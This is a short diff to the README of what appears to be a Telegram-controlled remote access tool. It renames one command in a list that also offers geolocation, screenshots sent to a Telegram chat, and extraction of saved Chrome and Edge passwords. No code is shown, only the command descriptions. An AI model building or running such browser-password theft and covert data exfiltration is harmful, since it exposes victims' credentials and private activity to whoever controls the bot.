@@ -82,7 +82,7 @@ Once the script is running, you can control it via Telegram by sending the follo
 - `/public_ip`: Get the public IP address of the device.
 - `/location`: Fetch the device's current location based on its public IP address.
 - `/os`: Get detailed system's OS information.
-- `/os`: Get detailed system information such as CPU, RAM, disks, and GPUs.
+- `/configuration`: Gather and send the system's detailed configuration (CPU, RAM, GPU, Disk)
 - `/chrome_password`: Extract Chrome's password
 - `/edge_password`: Extract Edge's password
 - `/screenshot`: Take a screenshot of the current screen and send it to the Telegram chat.
